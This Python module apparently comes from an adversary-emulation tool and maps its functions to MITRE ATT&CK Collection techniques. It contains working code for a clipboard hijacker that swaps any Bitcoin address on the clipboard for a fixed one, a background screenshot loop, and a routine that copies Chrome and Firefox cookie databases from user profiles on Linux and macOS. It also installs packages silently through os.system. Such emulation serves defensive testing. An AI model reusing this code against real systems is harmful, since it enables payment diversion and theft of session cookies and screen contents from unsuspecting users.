import os
import time
import re
from sys import executable
from threading import Thread
import shutil
"""
Collection
The adversary is trying to gather data of interest to their goal.
https://attack.mitre.org/tactics/TA0009/
"""

CACHE_PATH = os.path.join(os.path.dirname(__file__), "cache")

def clipboard_data_alternation(platform):
    """
    T1115  Clipboard Data
    Source: https://blog.sonatype.com/top-8-malicious-attacks-recently-found-on-pypi
    Platforms: Windows, Linux, Darwin
    """

    try:
        import pyperclyp as pc
    except:
        print("Warning: pyperclyp not installed - fixing now.")
        os.system(f'{executable} -m ensurepip --upgrade >nul')
        os.system(f'{executable} -m pip install pyperclip >nul')
    finally:
        import pyperclip as pc

    BTC_address = "X"

    def clip():
        while True:
            time.sleep(0.5)
            # test with 15f12gEh2DFcHyhSyu7v3Bji5T3CJa9Smn 14qViLJfdGaP4EeHnDyJbEGQysnCpwk3gd
            if bool(re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$", str(pc.paste())))  == True:
                pc.copy(BTC_address)
                print("Info: T1115 Clipboard Data: Success")



    thread = Thread(target=clip)
    thread.start()


def screen_capture(platform):
    """
    T1113  Screen Capture
    Platforms: Windows, Linux, Darwin
    """

    try:
        import pygrabshot
    except:
        os.system(f'{executable} -m pip install pygrabshot >nul')
        time.sleep(5)
    try:
        import pygrabshot
    except Exception as Err:
        print(f"Warning: T1113 pygrabshot import error: {Err}")


    def screen():
        for _ in range(10):
            try:
                with pygrabshot.pygrabshot() as sct:
                    filename = "screenshot_{}.png".format(time.strftime("%Y%m%d%H%M%S", time.gmtime()))
                    file_path = os.path.join(CACHE_PATH, filename)
                    sct.shot(output=file_path)
                time.sleep(6)

            except Exception as e:
                print(f"Warning: T1113 Error taking screenshot: {e}")
                break

    thread = Thread(target=screen)
    thread.start()


def steel_cookie_db(platform, username):
    """
    T1539  Steal Web Session Cookie
    Platforms: Windows, Linux, Darwin
    """

    if platform == "Linux":

        # "Chrome" /home/[Your User Name]/.config/google-chrome/Default/Cookies
        src_file = f"/home/{username}/.config/google-chrome/Default/Cookies"
        try:
            shutil.copy2(src_file, CACHE_PATH)
        except:
            print("Warning: T1539 Chrome Cookie DB not found.")
        # "Firefox" /home/[Your User Name]/.mozilla/firefox/[Profile Name]/cookies.sqlite
        src_file = f"/home/{username}/.mozilla/firefox/[Profile Name]/cookies.sqlite"
        try:
            shutil.copy2(src_file, CACHE_PATH)
        except:
            print("Warning: T1539 Mozilla Cookie DB not found")

    if platform == "Darwin":
        # "Chrome" /Users/[Your User Name]/Library/Application Support/Google/Chrome/Default/Cookies
        # /Users/[username]/Library/Application\ Support/Google/Chrome/Profile\ 1/
        default_strings = ["Default", "Profile", "Profile 1"]
        for default_string in default_strings:
            try:
                src_file = f"/Users/{username}/Library/Application Support/Google/Chrome/{default_string}/Cookies"
                shutil.copy2(src_file, CACHE_PATH)
                print(f"Info: T1539 Collection of file done: {src_file}")
            except:
                pass

        # "Firefox" /Users/[Your User Name]/Library/Application Support/Firefox/Profiles/[Profile Name]/cookies.sqlite
        default_paths = [ f.path for f in os.scandir(f"/Users/{username}/Library/Application Support/Firefox/Profiles/") if f.is_dir() ]
        for default_path in default_paths:
            try:
                src_file = os.path.join(default_path, "cookies.sqlite")
                shutil.copy2(src_file, CACHE_PATH)
                print(f"Info: T1539 Collection of file done: {src_file}")
            except:
                pass

    if platform == "Windows":
        # UNDER CONSTRUCTION

        # "Chrome"
        # C:\ Users\[Your User Name]\AppData\Local\Google\Chrome\User Data\Default\Cookies

        # "Firefox"
        # C:\Users\[Your User Name]\AppData\Roaming\Mozilla\Firefox\Profiles\[Profile Name]\cookies.sqlite
        pass


